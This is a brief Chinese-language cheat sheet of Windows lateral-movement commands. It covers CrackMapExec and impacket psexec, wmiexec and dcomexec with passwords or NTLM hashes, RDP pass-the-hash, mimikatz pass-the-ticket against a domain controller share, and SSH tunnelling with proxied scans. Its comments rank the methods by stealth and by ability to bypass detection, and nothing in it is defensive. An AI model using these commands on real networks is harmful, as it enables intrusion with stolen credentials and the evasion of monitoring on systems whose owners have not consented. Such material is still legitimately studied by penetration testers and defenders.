# Windows 横向移动技术详解

## WinRM (5985/5986) — 最推荐
```bash
cme winrm TARGET -u admin -p 'password' -x 'whoami'
cme winrm TARGET -u admin -H HASH -x 'whoami'    # PTH
```

## SMB/PSExec (445) — 经典，会创建服务（有日志）
```bash
psexec.py DOMAIN/admin:password@TARGET
psexec.py -hashes :NTLM_HASH DOMAIN/admin@TARGET
```

## WMI (135) — 相对隐蔽
```bash
wmiexec.py DOMAIN/admin:password@TARGET
wmiexec.py -hashes :NTLM_HASH DOMAIN/admin@TARGET
```

## DCOM — 不走 SMB，可绕过检测
```bash
dcomexec.py DOMAIN/admin:password@TARGET
```

## RDP (3389) — 图形界面
```bash
xfreerdp /v:TARGET /u:admin /p:password /cert-ignore
xfreerdp /v:TARGET /u:admin /pth:HASH /cert-ignore  # 需要 Restricted Admin 模式
```

## Pass-the-Ticket (PTT) — Kerberos 环境
```cmd
mimikatz "kerberos::ptt ticket.kirbi"
dir \\dc01\c$
```

## SSH 隧道（跨网段）
```bash
ssh -L 8080:10.10.10.5:80 user@jumpbox      # 本地端口转发
ssh -D 1080 user@jumpbox                      # 动态 SOCKS 代理
proxychains nmap -sT 10.10.10.0/24           # 通过代理扫描
```
